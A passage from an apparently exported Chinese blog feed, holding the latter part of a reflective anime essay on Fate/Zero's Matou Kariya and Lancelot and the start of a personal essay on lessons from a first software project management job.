后在绝望和理智的边缘挣扎的可能性，远坂葵直接深深误解了雁夜，还责怪雁夜“根本没爱过任何人”。也许，他人如何贬低自己，如何责怪自己，如何折磨自己，都不重要；只要自己知道自己在做什么，自己能够最终实现自己的梦想，自己能够发现自己所守护的人用赞同和期待的眼神看着自己，这就够了。然而，让他万万没想到的是，他此生最爱的女人，竟然对他说出了这么一句令人绝望的话，他此生所有的努力都是徒然。</p><p>“挣扎在死亡的边缘，恹然之躯承载着饱受痛苦折磨的灵魂，如果没有了自己所在乎之人的支撑，那么就让愤怒和憎恨的怒火焚烧自己吧，就让冲动和混沌支配自己吧，现在只想让我心里最爱的人闭嘴，我就当做你没有说过这些话，我也不想继续听到你的任何声音，我不想，我不想。请让我安静，请给我一点思考的余地，请给我一个冷静的机会，在此之前请你沉寂下来吧，我已经未能想象我自始而终所做的所有事情都是没有意义的这个念头到底给我多么可怕的冲击。不，不，我为了什么而付出生命的代价，我为了什么而不惜忍受着痛苦和孤独，我又是为了什么而甘愿受到憎恨的诅咒，我的灵魂已经支离破碎了，你也否定了我的一切，你也在蔑视我的尊严。我，到底是为了什么？”</p><p>也许，冲动的时候连他也不知道自己到底在做什么。看到倒在地上被自己掐晕的葵，雁夜的内心终于崩溃了。自己亲手伤害了自己曾经所想去守护的重要之人，难道最后还要让自己来否定自己的理想和人生吗？（其实当时我对言峰绮礼的感觉已经算是比较中肯，直到他主导了雁夜的最后的悲剧，玩坏了雁夜，言峰绮礼终于成功地让我恨上他了。）当他再次面对樱，樱再次疑问，到时候是否能够和妈妈在一起，他痛苦地扭曲着。对葵的强烈的“罪恶感”，对自己内心所追求的事物离自己越来越远的那种无奈和悔恨，自己除了做梦已经无法实现自己的诺言了。然而，即便这样，即使自己已经遍体鳞伤，还是考虑一定要把樱弄出间桐家，至于以后怎么样，至少让樱离开魔术师的世界，就足够了，在这个世界里，充满了太多悲惨的记忆。在我看来，即使雁夜最后还是想着守护樱的幸福，然而却依然是一种单方面的感情付出。这种让人心酸的爱，伴随着如同灯上随风摇曳的生命之火，随时将会在人世熄去；即便如此，他毅然在最后选择了战斗，虽然他控制不住战场的趋势。对葵抱有的愧疚和自责，对绝望的樱所给与的精神依托，他在Berserker疯狂地压榨他的魔力的情况下痛苦地死去，弥留之际，他的愿望在他的梦里延续开来。</p><p>纵观间桐雁夜的一生，作为一个普通人而离开家族的魔道的束缚，享受了正常人的生活，却付出了惨重的代价——所爱之人被他人夺走。他守护着他所重视的人，这份感情却从来未能让他人所承认，甚至是自己所爱的那个人；他也因为自己的爱，而甘愿被他人折磨，甘愿承担痛苦，甚至是被人作为愉悦的工具。虽然他作为一个想完成如此大的理想的气量并不够，冲动过，他憎恨过，他迷失过，但是他至少非常尽心尽力地对自己的理想负责了，虽然因此而付出了生命的代价。他的悲剧在于他“盲目”地相信任何人的话，他太重视自己的感情而未能理解他人所自己的这份感情所抱有的态度，他冲动地犯下了这一生最可怕的错误——伤害了自己所爱之人。虽然如此，我在这里，却看到了一个至情至理的普通人，为了梦想而努力过了。间桐雁夜，他一直知道自己想要什么，所以他就能够忍受各种生活，即使自己再凄惨，潜伏在黑夜中的独行者，却怀有着一颗闪亮的心，“即使自己的灵魂残破不堪，我也要拯救给你看”。对这种只为了平凡的生活而努力的人，我只能在此为他默哀。</p><p><img src="https://cos.gjcloak.xyz/pigo/202302200846750.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h2 id="平行线上的单恋"><a href="#平行线上的单恋" class="headerlink" title="平行线上的单恋"></a>平行线上的单恋</h2><h3 id="咱的心殇剧情の一"><a href="#咱的心殇剧情の一" class="headerlink" title="咱的心殇剧情の一"></a>咱的心殇剧情の一</h3><blockquote><p>你是我的太阳。<br>黑夜，永恒的黑暗，只属于我。<br>我需要黑夜，这样我才能生存下去，然而我却又追寻太阳。<br>我存活在黑暗之中，然而我却又憧憬阳光。</p><p>贪婪的阳光，吞食着我贮存的晦暗；而我却因为失去了属于我的这些，而逐渐被黑夜拭去。<br>白夜，夜色妖娆，却在地平线上衬出了黎明的曙光。<br>稍纵即逝的夜晚，就如我那短暂的生命。</p><p>你，依然是我的太阳。<br>至少在我心里，你高照着我，温暖着我。<br>然而，那明亮的光芒啊，可否看见，我那泪水闪动着它哀求的双眼。</p><p>我，属于黑夜，我孤独地在混沌的边缘行走。<br>你，在我心里，把我的眼睛拭亮。<br>昏暗的灯色把我抛弃在绝望的黑暗之中，然而我却能够看到一切，好明亮。</p></blockquote><p><img src="https://cos.gjcloak.xyz/pigo/202302200854191.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="远坂葵的人生の一"><a href="#远坂葵的人生の一" class="headerlink" title="远坂葵的人生の一"></a>远坂葵的人生の一</h3><p>间桐雁夜一直爱着远坂葵，这种爱没有要求他能够和葵在一起，却是要求他能够亲眼看见葵以及她的女儿得到作为一个普通人所能够享有的幸福，这样他就满足了，即使他可能此生不会和葵在一起。心里抱有着如此伟大而纯粹的爱的雁夜，却完全没有意识到葵到底是怎样看待他的感情以及葵到底是持着一份什么样的感情而步入远坂家，这就铸造了禁锢雁夜那悲惨的命运并最后将雁夜置于死地的阴暗而冰冷的死亡锁链。</p><p>我在此就不讨论远坂葵是怎样看待间桐雁夜的感情的问题，我却想说说葵她内心的“阴暗和扭曲”。雁夜的感情没有被葵发觉，而葵她本身就有着一种让人望而生畏的气息，也许作为和魔术师家族有渊源的人，其本身的思维和意志就当然会被魔术师的世界观所渲染。如果时臣在和雁夜对峙的时候阐明的那些魔术师世界中的事实，是正确的话，那么这些事实也同样在葵身上有用；很多人有时候会在讨论葵在那时候面对自己的女儿被送入间桐家，丈夫时臣有着如此不合常理的非凡理念，很简单地就能够想象到自己将不会在远坂家得到幸福的，然而为什么葵会依然这么爱着远坂时臣？也许“盲目”这个词用在她身上非常合适，然而我觉得这种想法也只是存在于我们对他们那魔术师的世界中观念未能充分地理解而导致了我们对她的所作所为产生了主观的最积极的内心反馈。我在上文已经提出了这个想法，就是魔术师的世界是停留在现实社会，却又是独立于现实世界之外的另一个普通人所难以企及的世界。那么，这时候我们在这个社会里面所依赖生存的价值观念，就不一定会适用于魔术师的世界里面了（也许，很多人会喜欢把一件事物引申到我们日常生活的种种方面，但是我想指出的是，我们必须遵循二次元里面给我们的世界观的考虑；即使二次元衍生于三次元，但是它是个独立的世界存在，我们在现实世界中的相关法则可以在二次元里面适用，但是我们却更得考虑二次元给我们暗示的这种让我们能够理解到的价值观。所以，我一直秉着如此的理念而写漫评，这也纯粹是当做个人的观点吧，至少我将不会对我的这种观念是否错误作任何质疑。）。</p><p>所以，在很多人眼里，葵的确是一个无可救药、跟着一群魔术师“发疯”、“盲目”爱着一个不该爱的人的人。虽说如此，我却得很明确地指出，葵生为一个和魔术师有渊源的家族，作为一个魔术师的妻子，她其实也有着很多无奈，她更有着一定的觉悟。远坂时臣说过，魔术师就是生而拥有“力量”的人，而且以后将拥有“更强力量”；而为了能够达到，抑或说是必须达到这种境界的话，就应该抛弃掉作为普通人的一部分思想，接受作为一个魔术师所应该有的思想。</p><p>因此，当雁夜发现樱不见了，而问葵樱去哪儿了，葵很平缓而带有忧伤的眼神跟雁夜说了那么些话，“间桐家没有合适的当家的原因你是知道的……如果你能有机会见到她，请你好好照顾她吧……”在这些言语里面，雁夜就应该清楚两件事：远坂葵根本没有责备他的意思，却是有着一种对命运的淡然的忧伤；远坂葵对她的丈夫做的决定完全没有抵抗之意，却在心里的另一面表现出接受的想法。但是，雁夜也许活在现实世界中太久了，没能触碰到魔术师的世界观到底是为何物，却直接断章取义认为这都是因为远坂时臣这么作决定而让葵和她的女儿分开，还把樱送到间桐家的虫仓里。不可原谅和怨恨在这时候就在雁夜的心里蔓延开来，夺走他的最爱他可以忍，但是得到了还如此践踏他的最爱，是可忍，孰不可忍？也就因为这样，间桐雁夜的悲剧就已经开始了，他无视了葵的内心的真实想法，却一方面想着自己理应承担起责任，不再让自己所在乎的人受伤，另一方面想着不能原谅葵的丈夫就这么胡作为非。由此，雁夜和葵之间的距离将再次被拉伸，葵的思想和感情，雁夜是绝对理解不了，也绝对感受不了；而雁夜也忘记了一个事实，那就是葵的家族她原本就和魔术师家族多有往来，他现在是用现实的自己的价值观去干涉魔术师的世界观，如果引用这么一句话“蜉蝣撼大树”来形容他的行为的话，我感觉是非常适合的。况且，雁夜他根本就没有考虑到，他现在决定的是和他最爱的女人所深爱的人进行厮杀，而葵却对雁夜的感情明显是不及于她对她的丈夫的感情。</p><p><img src="https://cos.gjcloak.xyz/pigo/202302200855424.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="远坂葵的人生の二"><a href="#远坂葵的人生の二" class="headerlink" title="远坂葵的人生の二"></a>远坂葵的人生の二</h3><p>在整部动画中，雁夜其实有很多机会让自己醒悟，自己追求的梦想始终就是一个幻影，然而他却始终未能想明白，却因为内心的极度矛盾而亲手断送他曾经想守护的那份幸福。在凛去冬木市拯救她的同学而遭遇危险被雁夜所救，在一公园里雁夜和葵进行了圣杯战争开始之后的第一次见面。那时候雁夜已经是把他对她们的幸福当做是支撑自己的精神的支柱，而且还很开心地说着，自己将会努力赢得胜利，然后把樱从间桐家解救出来，最后幸福地在一起享受作为一个普通人能够得到的幸福。而葵，这时候却是一种震惊而悲伤的表情，望着雁夜的背影而深沉地说了一句话：“雁夜，你难道是想和时臣同归于尽吗？”眼泪簌簌而下，让我突然间心痛纠结。远坂葵，即使和间桐雁夜存在于两个不同世界中，却依然有着一丝普通人的感情，她也有着心疼樱的感情，不然她就不会叫雁夜照顾樱；她流泪着，无奈地望着雁夜为了那虚无的理想而折磨自己，更是悲痛地想着时臣和雁夜终于要打起来了。很多人也许（就连我也会有着这种错觉）会觉得，如果在这个时候葵还不明白雁夜对她的感情，那她也太愚昧了。然而，她知道，却并非把那感情认为是爱情。她有着那种觉悟，就是自嫁入魔术师家族，就得明白自己将失去作为人的某一部分。她内心的这份痛楚和忧伤，雁夜全然没有注意到，却一味地认为葵也是一个受害者，他应该去拯救。</p><p>也许在教堂里面，雁夜即使被诬陷了，他也是有机会辩解的，然而他却没有。我其实当时在想，他是不是隐约明白了他所想要拯救的面前的这个他最爱的女人的幸福根本就是这个女人所可以舍弃掉的东西，而抓狂了？设身处地地为他想了很久，在葵的那句绝情的“你根本就没有爱过任何人”之后，他的任何言语已经苍白无力，除了行动之外，已经无以表达他的愤怒之情了。可悲的他瞬间察觉了他和她、他和魔术师的世界之间的隔阂，他瞬间发现自己除了残暴和强制之外，已经无法再用平时的那种温柔而坚强来掩饰自己的悲愤了。他哭了，他内心都被撕成碎片了，希望都是幻影，一切都是幻觉，以往的那些经历原来对她、对时臣来说，都是可有可无的事情。他绝望了，他发现他根本无能为力地再次实现自己的初衷了。在他悲愤地发觉到他和她其实自始自终都是处于两条永不相交的平行线上，而他却渴望着能够和她有着更美好更幸福的生活交集。泪水淋湿了一切，模糊了一切，在无助和孤独的边缘，他毅然撕碎了黑暗，手握着混沌，将灵魂交给了内心的阴暗，“去死，践踏了我的一切的东西，我诅咒你们！”</p><p>然而失去理智之后，却又是深深的自责，负有罪恶。伟大而悲情的男人，却不是一个聪明人，“聪明人懂得自救，伟大的人懂得救人”。所有的精神支柱被摧毁得一干二净，最后却依然放不下樱，他终于明白了在魔术家族里面的阴暗和凄惨，也许他根本就不想再让樱待在魔术家族里了（请允许我在此不再写樱对雁夜的真实想法，我至少想让雁夜能够依然活在他的梦中，让他安静而满足地死去）。也许樱被放出来，没有让他放心的人守护，他也至少想让樱不再接触魔术，那时候他已经理解了，在现实社会中再怎么落魄，都不如在魔术师的世界中承受这份苦楚来得深刻；那时候，我认为他也有着一种自我救赎的态度，为了让自己能够减轻对自己的那些不负责任的行为的苛责。一个多情的平凡人，就这么走向了人生的终点，在追求中死亡，在梦里得到慰藉；此生悲惨而怨恨，无奈而艰辛，最后他那梦里的笑颜让我不得不为之动容。那卑微的小小心愿，却惹得魂消魄散，费尽心血只是为了追求那毫无意义的幻影，还能有谁会觉得降临在自身的不幸会多于他么？</p><h3 id="咱的心殇剧情の二"><a href="#咱的心殇剧情の二" class="headerlink" title="咱的心殇剧情の二"></a>咱的心殇剧情の二</h3><blockquote><p>啊——<br>我即将离开这里。<br>在此之前，请原谅我写出打搅你的睡意的谦词。<br>请原谅我的言语有点过分——<br>好好活着，然后，去爱吧。<br>「你让我就像是落在荒原的野花，<br>犁铧经过，早已被碰撞得折枝叶残损。」</p><p>幽禁的心，残损的心，孤独的心。<br>命运注定要让你承受一切。<br>而你，终能习惯于伤痛么？</p></blockquote><h2 id="平行线的交织总伴有着扭曲"><a href="#平行线的交织总伴有着扭曲" class="headerlink" title="平行线的交织总伴有着扭曲"></a>平行线的交织总伴有着扭曲</h2><blockquote><p>“王不能存有这样的私情。　<br>她克制私情做出决策，他们也压抑私情地服从。　<br>就这样付出了牺牲，持续的胜仗带来了国内的安定。<br>代价就是对王的反感——<br>「亚瑟王啊，不了解人类的感情」　<br>一名骑士留下这句话，离开了王城。”　</p></blockquote><p>亚瑟王阿尔托莉雅骑士团中的第一骑士，“湖上骑士”，兰斯洛特（Lancelot），作为间桐雁夜的Servant，位居Berserker阶位被召唤。我一直纠结于兰斯洛特的历史真实度，当然并不是说真正意义上的历史考据，却是Fate&#x2F;Zero中对亚瑟王的身份已经进行了调整，那么将意味着历史将会在这种新型的世界观中重新定位。我一直在思考这几个问题，阿尔托莉雅和她的王后格尼薇儿之间的婚姻是怎样的性质？兰斯洛特作为王后的亲卫，和王后产生了“精神之爱”之后，阿尔托莉雅对他的这种“夺妻”行为又是把持什么态度？亚瑟王阿尔托莉雅最后到底有没有派遣十二位骑士去追杀兰斯洛特，还是她本人直接和兰斯洛特决斗？王后格尼薇儿是否被亚瑟王施以火刑未遂，却被兰斯洛特所救？对于这种大胆地将历史更改掉，从而设定出新的世界观下的“历史”，很容易让人把“历史”混淆掉。</p><p>鉴于我写这篇漫评需要的几个肯定的命题，我就暂定以下的小前提吧，若有错误抑或是歪曲了事实，倘若对这种动画世界观中的历史的整体性并无多大影响的话，那么就允许我有着如此不严谨的措辞（当然，倘若我有着一些比较重大的错误，那么恳请指出该错误，我好及时修稿）。首先，阿尔托莉雅很器重兰斯洛特，而且兰斯洛特在骑士团甚至是在整个王国都享有崇高的声誉；其次，兰斯洛特和王后格尼薇儿的私情被阿尔托莉雅发现之后，阿尔托莉雅并无责备之意，却内心因王后得到爱情的归属而欣慰；再次，王后和兰斯洛特的私情是被他人所揭发（有这么一说此人是亚瑟王的私生子莫德雷德），因为公众的压力，阿尔托莉雅被迫和兰斯洛特决战；最后，我在此将不考虑王后是否被施以火刑、兰斯洛特是否去劫刑场等，我还想再阐述一个命题，兰斯洛特最后被迫交出了王后格尼薇儿，这种“被迫”是怎样的我在所不问（也许是经过教皇的斡旋而基于骑士的荣誉送还了王后格尼薇儿）。</p><p><img src="https://cos.gjcloak.xyz/pigo/202302200857930.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="兰斯洛特的湖色之光"><a href="#兰斯洛特的湖色之光" class="headerlink" title="兰斯洛特的湖色之光"></a>兰斯洛特的湖色之光</h3><p>在这里，我不将对亚瑟王阿尔托莉雅的情感作阐述，我对“圆桌骑士”和“骑士精神”的看法并不多有慷慨之词，亚瑟王心里所崇尚的信念和现实中他的骑士团和人民相脱离，“骑士精神”在这里算是一个比较重要的原因。兰斯洛特，无论是在动画里面设定的世界观里抑或是现实的历史中，他都违背了“骑士精神”，有辱于自己的骑士之名；即便如此，阿尔托莉雅却丝毫没有去责怪他，却依然对他敬重有加。也许兰斯洛特根本就不知道他为什么得和阿尔托莉雅决战，他也许认为他和格尼薇儿的私情被传开了，有一部分原因可能就是亚瑟王自己透露出来的。我一直在寻找兰斯洛特恨阿尔托莉雅的原因，然而让我不思其解，除了对“骑士精神”的违背和迫于“骑士精神”而不得不忽视自己的自私之情而做出有违于自己内心期待的事情，还能够有什么事情能够让兰斯洛特——如此有名而优雅的“圆桌骑士”的第一骑士——如此耿耿于怀，以致这种对亚瑟王的怨恨成为了对他的灵魂的诅咒，最后以黑化的状态现形于世，只为于亚瑟王决一死战。也许，那时候阿尔托莉雅和他的对决，他就这么败在了亚瑟王的剑下，从而他的爱人格尼薇儿也从他的身边被夺去；即使如此，亚瑟王也丝毫没有对他有二三言的谴责，但是他却因此而认为亚瑟王在侮辱自己作为一个骑士的尊严。</p><p>那时候，如果兰斯洛特能够明白阿尔托莉雅的用心，他也许就无需如此纠结，而堕身仇恨的混沌之中，任由内心的阴暗摆布自己。“亚瑟王啊，不了解人类的感情。”这句话传说是兰斯洛特说的，然而无论这是否真实，我却总能感受到，他人对亚瑟王的感情的评价。Saber在被Rider征服王训斥的时候，就已经在意于那句“你是在守护人民，却不知道怎么去引导他们”，这种行为在现在看来，为什么和间桐雁夜的行为有着那么一丝的相像，然而因为两者的身份截然不同，那么体现在他们身上的行为效果和情感反馈必然也将不同。我一直在想着，每个人如果不顾及他人的感受，而一意孤行，着手那些让他人无法理解、无法接受、不可能实现的事情之时，也许当局人总会沉迷于此，而旁观者却对他的现况了如指掌；但是，旁观者却对他的情感一知半解，抑或是完全未能明白。那么即使他再怎么做，做得如何让他觉得这是最好的，也将不能引来他人对此的赞同。反过来说吧，兰斯洛特其实根本没有很深刻地去思考阿尔托莉雅为什么会这么做，虽然她的做法可能欠妥，但是如果自己没能去理解她当时这么做的缘由的话，那么自己就根据自己内心的随便猜忌而一次次地否定自己、伤害自己，由此就对他人产生一种怨恨，只是因为他人让自己痛苦了。</p><p>兰斯洛特因为和亚瑟王的对决，而在此之后认为自己的骑士尊严受到莫大的羞辱；因为骑士的“荣誉”，兰斯洛特不得不奉还他的爱人。围绕着责任和私情，以及自己的最爱被从自己身边剥夺，自己的尊严被人践踏，他失去了理智。这种悲剧和间桐雁夜比较相似，然而兰斯洛特他内心存在的仇恨却是比间桐雁夜要更加严重。在此，我总会想着这个和人的“气量”的关系，不过我随即便将这个念头抛弃掉了，如果这样就去论述他们的“气度”的话，这也有违于他们当时内心的一些真实想法了。也许，我们拥有了我们想拥有的，而后当我们失去了那么一部分对我们来说根本不是很重要的事物，那么这时候我们却因此而体现出强烈的情绪，那么我们却有愧于作为人所应当有的矜持；然而，我们很少会去经历这么让我们痛苦的事情，那就是失去了当时自己最珍惜的一部分事物，作为一个人而言，这是一种对自己的幸福的流失而应该会抱有的相应的感情，那就是失落和不舍。当自己发现自己失去了那么多重要的东西，却是因为他人造成的，无论是间接还是直接，还是不可抗力、不可预见、疏忽大意，我们都会因此而将怨恨转移到行为人的身上，想让他因此而付出惨重的代价。我们不能苛求每个人都能够像理想中那样，希望他怎么样就怎么样，即使在我们的眼里，他现在的所作所为是多么不合理。兰斯洛特不能原谅亚瑟王，他认为是阿尔托莉雅剥夺了他的一切，他带着仇恨和怒火，内心失去以往那犹如湖面上的宁谧，充斥着一股股燃烧的黑暗之焰，只想和亚瑟王再次决战雪耻。也许，可能并非雪耻，而是为了找到答案吧……</p><p>无论是当时的Saber亚瑟王和Berserker兰斯洛特之间的理念距离，还是间桐雁夜心里所崇尚的幸福生活和那魔术师的世界观里面的生活之间的理念距离，是多么遥远，就如同背驰于命运之上的两条平行线，永远没有交集。倘若要它们有着一丝交集，那么必将导致命运之中的一部分扭曲和重叠，这种扭曲和重叠之间，又是能够发生多少互相排斥的反应。即便如此，宁可让自身的肉体毁灭，灵魂再如何被摧残得破损不堪，也要达到目的的Berserker和间桐雁夜，我在此已经找不到什么言语去评价他们的行为了，过于执着之后将期待着永恒黑暗的“盲目”。</p><h2 id="记：「死亡」抹不掉人生的一切"><a href="#记：「死亡」抹不掉人生的一切" class="headerlink" title="记：「死亡」抹不掉人生的一切"></a>记：「死亡」抹不掉人生的一切</h2><p>我觉得自己是该停笔了。</p><p>也许总感觉Berserker的戏份好少，嘛，我实在对他没什么好写的，难道真的是因为我很少看到他出场的缘故吗？（笑）</p><p>间桐雁夜和兰斯洛特，其实在动画里面的设定，都是可黑可白的。很多人都会指责他们内心的气量不够，他们嫉妒他人得到自己想要的东西，最后又把持不住自己的理性而发狂，内心被长期滋长的仇恨所渲染，而导致自己做出那么多让他人所难以接受的事情。我对此也不想再多作评价之意。</p><p>我头疼欲裂，我内心如同窗外那骤然洒下的暴雨中的一片枯叶，在雾气和雨水的席卷中挣扎于世间，一阵阵强烈的绞痛。我对他们的想法也许过于单纯，也许过于简单，也许过于主观片面，然而我想，这就是我心中的Berserker和间桐雁夜。他们都曾经失去了他们的最重要的东西，他们也都在内心挣扎了，虽然他们所追求的对自己内心的这份黑暗和晦涩的抚平的方式根本不同，然则他们在这种追求的过程中，走向了生命的终结。</p><p>哎，我实在是写不出什么了，我对他们的感受，也已经倾诉完了，我突然就想着，人与人之间的相互理解，原来也真的不是一件很容易的事情。我们追求的事物也许在他人眼中根本是不重要的，我们最后发现自己所追求的事物却是一种幻影而自己根本没有得到什么，我们甚至会察觉到我们所守护的那份感情在本质上也是在“背叛”着我们，哭笑不得，感叹造化弄人啊。不知道是不是我自己错了，Master召唤英灵的时候，不一定需要实物，如果自己内心的某种感情够强烈的话，就能够召唤出具有和这种情感相似的Servant出来？如果是这样的话，那么当时间桐雁夜对远坂时臣的恨也果断是真的啊，而且还恨着为什么夺走了自己的爱却不好好珍惜（里面并没有嫉妒之情吧，就雁夜来说，兰斯洛特就不知道了）。</p><p>嘛，写到这里了。雁夜叔，真的是无愧于自己的内心，虽然所作所为毫无意义，虽然自己在某种意义上来说被当做他人的愉悦工具，但是他是一个好人，懂得如何对待他所爱、所重视之人，他也是个好叔叔，小樱和小凛都很喜欢他。在梦的延伸里，希望他能够一直走下去，永远不要醒来，只要不醒来，这个残酷的世界便不存在。</p><blockquote><p>「不尽轮回和光阴的不停息的流逝。<br>我不会完全死亡，我的大部分<br>将躲过死神，虽死而犹有生机，<br>死后的荣誉将会使我继续生存。」<br>——贺拉斯 《我立了一座纪念碑》</p></blockquote><p><img src="https://cos.gjcloak.xyz/pigo/202302200857162.png?imageMogr2/format/webp/interlace/1/quality/80"></p>]]></content>
      
      
      <categories>
          
          <category> 专栏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Berserker </tag>
            
            <tag> fate </tag>
            
            <tag> 间桐雁夜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件开发项目管理：第一次深入思考</title>
      <link href="/384.html"/>
      <url>/384.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整理资料，偶然发现自己十多年前写的一篇总结，当时参加工作三年，第一次做项目经理，带了第一个项目，感想颇多，所以写了这么一篇东西，满满的、认认真真的“青涩”。</p><p>简单整理一下，做一下“脱敏”，基本上原汁原味贴出来，重温一下自己的“青葱”岁月。项目名称就叫“A项目”吧，第一个嘛。这是一个软件开发项目，受客户方委托为其通信网关设备开发软件部分，包括通信协议互联互通和人机接口。</p><h2 id="关于项目管理的思考"><a href="#关于项目管理的思考" class="headerlink" title="关于项目管理的思考"></a>关于项目管理的思考</h2><p>通过A项目的实践，越来越认识到项目管理工作在一个软件开发过程中的重要性。在A项目的实施过程中，的确学习到和感悟到了许多自认为有用的东西，想法还不是很成熟，记录下来以备忘。</p><p>我总是想把自己学习到的某一方面的东西纳入一个体系，于是，在这段工作实践中我的头脑里逐渐形成了下面的模型，它描述了目前我对项目管理工作的理解。</p><p><img src="https://cos.gjcloak.xyz/upload/2023/02/1537980250.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>这个模型由四部分组成：产品的风险和质量、开发流程、管理制度、团队建设。其中“产品的风险和质量”是项目管理最核心的东西，其它部分都是围绕这个核心，为核心服务的，它们对这个核心所起的作用，也是由外到内逐步增强的。</p><h3 id="产品的风险和质量"><a href="#产品的风险和质量" class="headerlink" title="产品的风险和质量"></a>产品的风险和质量</h3><p>在产品开发过程中，始终会面对两个关键的问题，一是产品的风险，二是产品的质量。这里所说的产品的风险，主要是指技术风险，在A项目中，通信协议与其他厂家设备互联互通是开发过程中最大的技术风险。虽然我们采取了很多技术手段和努力很好地解决了这个风险，但在项目实施过程中，也充分暴露出了我们团队的产品意识不强的弱点。</p><p>多数技术人员都是喜欢解决开发过程的技术难题和实现基本功能，这些工作对于他们才是具有挑战性的工作，才能激发他们的工作热情，而对于繁杂的保证产品质量的工作，明显不够重视、缺乏耐心，也就是说产品的质量意识不强。在A项目中，我估计如果只实现基本功能大概只需要30％的工作，而要做到功能完善、性能稳定，又多付出了70％的努力。打个比方，前面30％的工作是伐木工人的工作，后面70％是木匠的工作，通过伐木工人的工作，可以得到一块好的毛坯，但此时毛坯的价值还主要是原材料的价值，通过后面木匠的70％的工作后，毛坯变成了精美的器具，此时材料的价值和人的价值得到了最大的体现。</p><p>在项目的后期，我时常问自己：一群高手真的能做出好的产品吗？客户方的一位资深QA的看法是“未必”。他说在以前一个项目中可以说高手云集，但后来那个项目却做得很糟。可见，如果没有一个好的开发流程做保障，或者不去遵循产品开发过程的一些规律，即使是高手，在项目中所起的作用也是有限的。</p><h3 id="开发流程"><a href="#开发流程" class="headerlink" title="开发流程"></a>开发流程</h3><p>客户方的开发流程管理应该说是比较成功的，虽然它还有一些缺陷，还有一些值得推敲的地方。说它成功是因为：首先，客户方的开发流程管理没有流于形式，而是真正贯彻到了产品开发过程中去了；其次，在A项目的开发过程中，的确看到了这套机制的效果，真正指导了我们的工作并保证了非常好的产品质量。我的一些理解如下：</p><p><img src="https://cos.gjcloak.xyz/upload/2023/02/3609671014.png?imageMogr2/format/webp/interlace/1/quality/80"></p><ol><li>先从软件开发过程与传统工业生产过程的区别说起。如上图所示的V字模型，在它的每一个环节都要输出满足质量要求的文档（或代码）。从这个流程上看，它是很机械的一个东西，看上去像传统工业的生产流程，但其实并不是。传统工业和软件业的差别很大，在传统工业中，机器的重要性占80％，人的重要性只能占20％；而在软件开发中，人的重要性占80％，机器的重要性只能占20％。所以，我想这个V字模型的实施，应该是主要在“人”的身上，也就是说，软件开发过程的管理主要是对人的管理。</li><li>淡化个人对项目的影响，靠制度去保证项目。在A项目的实施过程中，我越来越感到个人对这个项目的影响越来越小，这包括两个方面，一是人员变动对整个项目的影响变小，二是个人水平对整个项目的影响变小。因为在项目开发工程中，我们非常强调知识共享和集体的监督，也就是说自己做的一部分工作，要得到大家的认可，如设计文档的审阅评审，代码走读，重要的技术方案大家讨论决定，各个模块的接口要由各个模块的负责人共同约定，这样即有效避免了个人对技术的“垄断”，同时也减少个人的错误留在项目中的机会。</li><li>通过统计的办法，去量化开发过程。我觉得软件产品和传统工业产品另一个区别是：软件产品逻辑密集。一个几万行代码的产品，实际就是几万个逻辑的集中体现。所以对于一个大型的项目，达到代码或逻辑的完全正确、系统的最优化是不可能的。在A项目中，每个阶段都有质量目标，这个质量目标有下限和上限，只有发现的问题数落在在这个范围内，就认为是可以接受的，就可以进入下一个阶段了。不同软件产品的技术实现方法、应用环境、开发队伍的成熟程度，都在很大程度上影响产品质量，所以还需要针对不同情况，根据经验调整质量目标。在A项目中，由于存在与其他厂家设备的互通问题、外部接口过多问题，所以在最后的系统测试阶段就适当地调高了质量目标，最后的测试结果表明，这种调整是合理的。</li><li>在这个项目实施过程中，我也体会到了实行这些规范的开发流程需要很高的成本，如输出文档、代码的评审，需要很多人力和时间，客观上使项目开发周期延长，建立产品质量数据库需要一个积累的过程，所以有些做法不一定适合规模小的公司。但是，CMM的过程管理可以看作是一个完整的过程，也可以看作是一个个具体的手段，这样就可以在项目中逐渐应用这些手段。</li></ol><p>在A项目中，我们的一些工作方法取得了很好的效果：</p><ol><li>我们的开发流程总体上符合V字模型，但考虑到成本、质量、时间这个三角关系，我们是做了一些变通的。如A项目一期的工作，由于主要是追求速度，所以就没有严格按质量目标去操作，这是合理的；二期主要是追求质量，所以质量目标实现的比较好。在开发过程中，以过程去保证质量，而不是以测试去保证质量的思想，落实的也比较理想。</li><li>充分的需求分析工作使整个项目站在了一个比较坚实的起点上。首先，在这个阶段解决了大部分的技术风险，即使是没有解决的风险，在后期也是基本可控的。后来的工作表明，这个阶段出现的问题，如其他厂商设备的信令机制没有分析清楚，最后代码的调整比较大、比较频繁，使设计阶段、编码阶段和测试阶段的一些工作变得没有意义。其次，实现了一些原型，虽然这些原型最后是要丢弃的，但它大大降低了整个项目的风险。而我之前所参与的项目，没有一个明显的需求分析阶段，准备工作明显不足，在项目实施过程中很多时候纠缠于技术攻关、调整框架、修改BUG，浪费了很多时间和精力，得不偿失。</li><li>周例会制度贯彻的比较好。在周例会上，一是总结上周的工作情况，对于工作中出现的问题，制定解决办法，对于好的经验，及时推广；二是制定本周的工作计划，明确下达任务、指定负责人、确定期限，及时调配资源，分析在下一步工作中有可能遇到的问题；三是讨论重要的技术问题，对于涉及项目组间的一些重要问题，或难度比较大的技术问题，大家共同讨论决定，对于规模比较大的项目，会遇见很多这样的问题。</li><li>问题跟踪机制比较严格。对文档、代码的修改，尤其是后期系统测试阶段对代码进行修改，需要提详细的问题单，指定问题修改人，修改后要有项目经理或系统工程师确认并签字，这样做有效地控制了问题，最大限度地避免了由于修改问题而带来更多问题的情况发生，有效防止了项目的失控。</li><li>在项目实施过程中，我们的团队很明显地感觉到来自于产品部门和质量部门的压力。产品部门希望又快又好地拿出产品，质量部门关心的是在各个开发阶段是否达到了质量目标，我想我们研发部门本能地会想省一点力气吧。各部门的出发角度不同，就造成了一种牵制关系，使研发部门又要提高效率，又要兼顾质量，我觉得对整个产品的效果还是比较好的。</li></ol><h3 id="管理制度"><a href="#管理制度" class="headerlink" 